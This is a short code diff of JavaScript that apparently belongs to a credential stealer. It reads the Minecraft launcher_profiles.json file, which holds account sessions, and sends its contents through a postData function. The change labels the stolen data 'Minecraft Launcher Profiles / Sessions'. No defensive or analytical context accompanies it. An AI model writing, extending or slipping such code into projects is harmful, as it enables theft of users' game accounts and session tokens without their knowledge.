@@ -25,7 +25,7 @@ const getMinecraftFolder = () => {
 };
 
 if (fs.existsSync(getMinecraftFolder()) && fs.existsSync(`${getMinecraftFolder()}\\launcher_profiles.json`)) {
-    postData(fs.readFileSync(`${getMinecraftFolder()}\\launcher_profiles.json`, 'utf8'));
+    postData(fs.readFileSync(`${getMinecraftFolder()}\\launcher_profiles.json`, 'utf8'), 'Minecraft Launcher Profiles / Sessions');
 } else {
     postData('Minecraft directory or launcher profiles file not found.');
 }
